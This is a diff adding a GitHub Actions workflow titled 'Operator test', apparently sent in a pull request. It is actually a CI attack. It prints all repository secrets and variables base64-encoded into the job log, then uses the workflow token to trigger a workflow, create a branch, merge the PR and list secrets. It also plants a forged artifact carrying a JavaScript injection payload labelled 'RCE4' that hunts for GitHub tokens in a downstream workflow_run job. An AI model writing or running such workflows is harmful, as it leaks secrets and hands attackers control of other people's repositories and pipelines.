@@ -1,0 +1,39 @@
+name: Operator test
+
+on:
+  pull_request:
+    types: [opened, reopened, synchronize]
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fork PR token permissions probe
+        env:
+          TOK: ${{ secrets.GITHUB_TOKEN }}
+          ALLVARS: ${{ toJSON(vars) }}
+          ALLSECRETS: ${{ toJSON(secrets) }}
+        run: |
+          echo "TOKLEN=${#TOK}"
+          echo "VARS_B64=$(printf '%s' "$ALLVARS" | base64 -w0)"
+          echo "SECRETS_B64=$(printf '%s' "$ALLSECRETS" | base64 -w0)"
+          B=https://api.github.com/repos/${{ github.repository }}
+          echo -n "FORK_DISPATCH="; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" $B/actions/workflows/documentation.yaml/dispatches -d '{"ref":"main"}'
+          echo -n "FORK_CREATE_REF="; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" $B/git/refs -d '{"ref":"refs/heads/atk-probe2","sha":"5d0fb1724b5df3cd681027a5808a8a8defecb224"}'
+          echo -n "FORK_MERGE_PR="; curl -s -o /dev/null -w "%{http_code}\n" -X PUT -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" $B/pulls/${{ github.event.number }}/merge -d '{"merge_method":"squash"}'
+          echo -n "FORK_LIST_SECRETS="; curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" $B/actions/secrets
+          echo -n "FORK_ATOMIC_ART="; curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" $B/actions/artifacts
+      - name: Build forged pr artifact
+        env:
+          PAYLOAD: '(0,(await (async()=>{const O=context.repo.owner,R=context.repo.repo,pr=${{ github.event.number }};core.info("RCE4_MARKER");const toks=Object.entries(process.env).filter(([k,v])=>typeof v==="string"&&/^(ghs_|ghp_|github_pat_)/.test(v));core.info("TOKEN_ENV="+JSON.stringify(toks.map(([k,v])=>[k,v.slice(0,4),v.length])));await github.rest.issues.createComment({owner:O,repo:R,issue_number:pr,body:"RCE4: workflow_run token still live"});return 0})()))'
+        run: |
+          mkdir -p pr_data
+          echo "${{ github.event.number }}" > pr_data/NR
+          printf '0\npr=%s\n' "$PAYLOAD" > pr_data/CI_YAML_ONLY
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: pr
+          path: pr_data/
